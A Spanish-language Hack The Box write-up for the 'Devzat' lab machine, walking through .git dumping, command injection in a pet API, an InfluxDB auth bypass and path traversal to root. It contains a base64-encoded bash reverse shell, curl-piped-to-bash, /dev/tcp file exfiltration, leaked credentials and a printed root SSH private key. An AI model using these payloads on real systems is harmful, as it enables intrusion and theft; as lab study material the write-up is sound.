---
layout: single
title: Devzat - Hack The Box
excerpt: "Aqui explotamos un repo de Github y una aplicacion personalizada"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-devzat/devzat1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - Git
  - script exploitation 
---

![](/assets/images/htb-devzat/devzat1.png)

---------------------
# Devzat - 10.10.10.89 

## Part 1: Reconocimiento inicial

Puertos abiertos 22(ssh), 80(http) y 8000(apache, pero no responde):  
- El scaneo de nmap ha revelado el dominio ```http://devzat.htb/```  

![](/assets/images/htb-devzat/devzat2.png)


La web del puerto 80 "devzat" habla de una aplicación de chat:  
- Dice que esta programada por el creador de la web (un tal patrick) supuestamente.  
- También habla de "Branches" por lo que seguro que es un proyecto **/git**, hay dos versiones, una estable y otra que no (por tener una nueva funcionalidad para subir archivos)   
- También que va con un cliente de ssh. ```ssh -l [username] devzat.htb -p 8000```  

Los links que encontramos en el codigo fuente como **/generic.html** no tiene nada que sacar.  
Fuzeando rutas no encuentro nada nuevo interesante, pero con subdominios si.  
```console
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 404,302 -H "Host: FUZZ.devzat.htb" -u http://devzat.htb -t 100
000003745:   200        20 L     35 W       510 Ch      "pets"
└─$ wfuzz -c --hc=404 -t 200 --hw=35 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://pets.devzat.htb/FUZZ/
000002861:   200        4 L      6 W        81 Ch       "build"
```
---------------------

## Parte 2: Probando el chat

```console
└─$ ssh -l cucuxii devzat.htb -p 8000
devbot: cucuxii has joined the chat
cucuxii: help
devbot: See available commands with /commands or see help with /help ⭐
cucuxii: /commands
cucuxii: /users #  Solo estoy yo
cucuxii: /room # Solo está "main" conmigo
cucuxii: /id # -> ip hasheada, me sale df6f2999ac39225cf81260719423b5a2572ff7b3843a7aca8e5286c09f0cef0a
# Aparte de eso hay juegos como el tictactoe, el ahorcado y demas...
```

---------------------
## Part 3: Analizando el repo de pets

Como no hay nada interesante, en ambas webs trato de buscar la carpeta /.git (porque antes mencionaban lo de las branches y la version inestable).  
Este .git existe en el de pets.  

![](/assets/images/htb-devzat/devzat3.png)

Hay una herramienta para armar los repos llamada git-dumper ```sudo pip install git-dumper```  
```console
└─$ git-dumper http://pets.devzat.htb/.git/ ./.git
└─$ git log 
ef07a04 (HEAD -> master) back again to localhost only  
464614f fixed broken fonts
8274d7a init
└─$ git diff ef07a04 464614f  # Ahora solo funciona en el localhost, puerto 5000
└─$ git diff ef07a04 8274d7a  # Tema de fuentes 
└─$ git branch -a  # Solo la * master (para las otras igual) 
```
En la carpeta **/characteristics** hay archivos de varios animales con textos "Having a cat is like living in a shared apartment."  
El codigo fuente de la app está en **/src/App.svelte** y **/main.go**   
Analizamos el main.go en busqueda de funciones peligrosas:  
```console
└─$ cat main.go | grep -E "system|exec"
cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
```
Parece que hay que introducirle un animal y te muestra su seccion de la carpeta characteristics.    
O sea si species es *gato* pues te sale lo del *gato*.    

En la web hay una sección para elegir un animal y que se añada a la lista con la descripción.    
Ej si pones un perro llamado "Pizarro" se añadira con la descripción del perro de la carpeta **/characteristicas**  

![](/assets/images/htb-devzat/devzat4.png)

Añadimos un gato llamado "Benito":  
```/POST a http://pets.devzat/api/pet {"name":"Benito","species":"cat"}```
Segun lo de antes la parte vulnerable es species.  

Si pongo ";id" en species no sale nada raro, pero si me hago un ping ```";ping -c 1 10.10.14.12"``` recibo traza (```sudo tcpdump -i tun0 icmp -n```)
```console
└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'" | base64 -w0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK
└─$ curl -s -X POST "http://pets.devzat.htb/api/pet" -H "Content-type: application/json"
-d '{"Name":"Benito", "Species":"; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK | base64 -d | bash "}'
```
-----------------------------
## Part 4: Entrando en el sistema

Recibimos una consola como el tal patrcick con netcat ```sudo nc -nlvp 443```  
Corremos nuestro script de reconocimeinto ```curl http://10.10.14.12/lin_info_xii.sh | bash```:  
- Somos patrick, el resto de usaurios son root y catherine  
- Hay dos backups /var/backups/devzat-dev.zip y /var/backups/devzat-main.zip  
- Se esta corriendo por root -> /root/devzat/start.sh devchat  
- No hay capabilities ni SUIDs interesantes  
- Tanto el puerto 8086, como el 5000 como el 8443 están abiertos solo al localhost  
Antes habiamos leido que el devchat corre por el localhost en el puerto 5000:  
```console
patrick@devzat:~/pets$ ssh -l patrick 127.0.0.1 -p 5000
kex_exchange_identification: Connection closed by remote host
```
En cuanto a los puertos 8086 y 8443:  
```console
patrick@devzat:/home/catherine$ curl http://127.0.0.1:8443
curl: (1) Received HTTP/0.9 when not allowed
```
Haremos port forwarding para traernoslos mejor.  
```console
patrick@devzat:/home/catherine$ cd /tmp
patrick@devzat:/tmp$ curl http://10.10.14.12/binarios/chisel_amd64 -O
patrick@devzat:/tmp$ chmod +x chisel_amd64; mv chisel_amd64 chisel
└─$ ./chisel_amd64 server --reverse -p 1234 &
patrick@devzat:/tmp$ ./chisel client 10.10.14.12:1234 R:8086:127.0.0.1:8086 R:8443:127.0.0.1:8443 R:5000:127.0.0.1:5000
```
Ya podemos acceder a esos puertos desde nuestro sistema:  
Por curl no hay resultado, por netcat pone cosas raras... Pero sabemos que esto decia que habia una versión inestable del chat corriendo por el puerto interno 5000  
```console
└─$ nc 127.0.0.1 8443   
SSH-2.0-Go
^C
└─$ ssh -l patrick 127.0.0.1 -p 5000  # Connection closed
└─$ ssh -l patrick 127.0.0.1 -p 8443
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
patrick: /commands
[SYSTEM] file - Paste a files content directly to chat [alpha] # este no estaba en la version públic.a
patrick: /file
[SYSTEM] Please provide file to print and the password
```
No tenemos contraseña y no sabemos que hacer, ademas no sabemos que son estos puertos internos  
```
└─$ nmap -sCV -p8443,8086,5000 127.0.0.1 -T5 -v
5000/tcp open  upnp?
Server: My genious go pet server   # La aplicacion de las mascotas :V
8086/tcp open  http    InfluxDB http admin 1.7.5 # ???
8443/tcp open  ssh     (protocol 2.0) # El servidor del chat
```
Segun lo que he leido en internet influxdDb es un sistema de bases de datos parecido a sql  
En la web de [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb) dice que hay que registrarse con un cliente con un usuario/contraseña, no disponemos  
de ello, pero nos hablan de un [exploit](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) para bypasearlo.  

Tiene un script de python __main__.py (renombrar a exploit.py) y un archivo users.txt (diccionario de usaurios)  
```console
└─$ python3 exploit.py

Host (default: localhost): 
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): 

Bruteforcing usernames ...  [v] admin
Host vulnerable !!!
[admin@127.0.0.1/devzat] $ show databases # -> devzat e _internal
[admin@127.0.0.1/devzat] $ show measurementes # igual al show tables de mysql -> user
[admin@127.0.0.1/devzat] $ select * from "user" 
# Credenciales
"wilhelm":"WillyWonka2021"
"catherine":"woBeeYareedahc7Oogeephies7Aiseci"
"charles":"RoyalQueenBee$"
```
Analizando el exploit de antes parece que la versiones previas de influx a 1.7.6 le podias enviar una cookie hecha con un secreto vacío, el exploit intentar mandarlo
con cada uno de los usaurios mas comunes (como admin)  
```
# Token -> {"username" : "admin", "exp": exp}   # exp es el tiempo actual + 2.628 * 10 elevado a 6.
# Cookie -> token = jwt.encode(payload, "", algorithm="HS256")
# Authorization: bearer -> token
```

---------------------------
## Part 5: Escalando privilegios

Como tenemos la contraseña de la Catherine: 
```console
└─$ ssh -l catherine 127.0.0.1 -p 8443
patrick: Ey Catherine, me alegro de verte.
catherine: Hey compañero, en que has estado ultimamente?
patrick: Recuerdas la utilidad tan guay de la que te hablé el otro dia?
catherine: Si
patrick: Yo la implementé. Si quieres verla conectate al la intancia local por el puerto 8443.
catherine: Esque estoy algo liada ahora... 👔
patrick: Bueno, está bien 👍  Necesitarás una contraseña para entrar. La he dejado en nuestra zona de backups
catherine: k
patrick: También puse la versión pública para que la puedas usar tambien.
catherine: Ok, en cuanto el jefe me deje un rato, le echaré un vistazo.
patrick: Genial, deseando saber tu opinión. Es una alfa, o sea no es segura del todo. Hasta luego lucas!
devbot: patrick has left the chat

catherine: /file "/etc/passwd" "woBeeYareedahc7Oogeephies7Aiseci"
# Contraseña incorrecta
```
No podemos hacer ssh con las creds de esta señora, pero si acceder desde la consola del sistema que ya tenemos.  
```console
patrick@devzat:/tmp$ su catherine
Password: woBeeYareedahc7Oogeephies7Aiseci
```
Habia dicho antes algo de archivos backup, en /backups estan:  
```console
/var/backups/devzat-main.zip
/var/backups/devzat-dev.zip
catherine@devzat:/var/backups$ cat devzat-dev.zip > /dev/tcp/10.10.14.12/444
└─$ sudo nc -nlvp 444 > dev.zip
Ncat: Connection from 10.10.11.118:47536.
catherine@devzat:/var/backups$ cat devzat-main.zip > /dev/tcp/10.10.14.12/444
└─$ sudo nc -nlvp 444 > dev.zip
Ncat: Connection from 10.10.11.118:47550.

# Creo en mi sistema una carpeta con los zips y los unzipeo ahí
└─$ diff dev main
< 	// Check my secure password
< 	if pass != "CeilingCatStillAThingIn2021?" {
< 		u.system("You did provide the wrong password")
< 		return

└─$ ssh -l catherine 127.0.0.1 -p 8443 
catherine: /file /etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/etc/passwd does not exist!
catherine: /file /root/.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/.ssh/id_rsa does not exist!
catherine: /file ../../root/.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
# Nos la copiamos en un archivo llamado "id_rsa"
└─$ chmod 600 id_rsa   
└─$ ssh -i id_rsa root@devzat.htb
root@devzat:~#
```

